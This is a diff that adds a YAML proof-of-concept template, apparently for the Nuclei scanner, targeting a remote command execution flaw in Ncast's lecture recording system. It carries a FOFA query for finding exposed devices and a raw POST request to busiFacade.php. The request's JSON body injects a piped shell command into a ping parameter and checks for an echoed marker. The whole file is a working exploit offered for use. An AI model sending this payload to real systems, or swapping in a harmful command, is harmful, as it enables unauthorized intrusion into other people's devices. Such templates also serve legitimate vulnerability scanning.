@@ -1,0 +1,57 @@
+id: poc-yilheshd3fdarnmp
+info:
+  name: Ncast盈可视高清智能录播系统busiFacade RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yilheshd3fdarnmp'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: yilheshd3fdarnmp
+    fofa: app="Ncast-产品" && title=="高清智能录播系统"
+http:
+- raw:
+  - 'POST /classes/common/busiFacade.php HTTP/1.1
+
+
+    Connection: close
+
+
+    Accept: */*
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+
+    X-Requested-With: XMLHttpRequest
+
+
+
+
+    %7B%22name%22:%22ping%22,%22serviceName%22:%22SysManager%22,%22userTransaction%22:false,%22param%22:%5B%22ping%20127.0.0.1%20%7C%20echo%20dudesuite%22%5D%7D
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    dudesuite
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
